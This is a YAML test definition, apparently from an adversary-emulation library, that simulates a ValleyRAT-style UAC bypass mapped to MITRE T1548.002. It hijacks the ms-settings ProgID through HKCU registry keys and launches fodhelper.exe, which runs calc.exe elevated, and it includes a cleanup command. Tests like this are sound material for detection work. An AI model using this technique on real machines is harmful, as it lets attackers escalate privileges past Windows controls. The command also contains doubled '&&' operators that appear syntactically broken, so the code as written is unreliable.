- description: 'This atomic designed to simulate the UAC bypassed made by ValleyRAT
    by adding customized ProgIDs registry entry.

    '
  id: f45c090c-cf75-d0fc-c18f-8d1c2abdb6ea
  name: UAC bypassed by Utilizing ProgIDs registry.
  platforms:
    windows:
      cmd:
        cleanup: reg delete "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command"
          /ve /f && reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer"
          /ve /f
        command: reg add "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command"
          /ve /d "C:\Windows\System32\calc.exe" /f &&  && reg add "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer"
          /ve /d ".pwn" /f &&  && echo Triggering fodhelper.exe for potential privilege
          escalation... && start fodhelper.exe
        payloads: []
  tactic: multiple
  technique:
    attack_id: T1548.002
    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
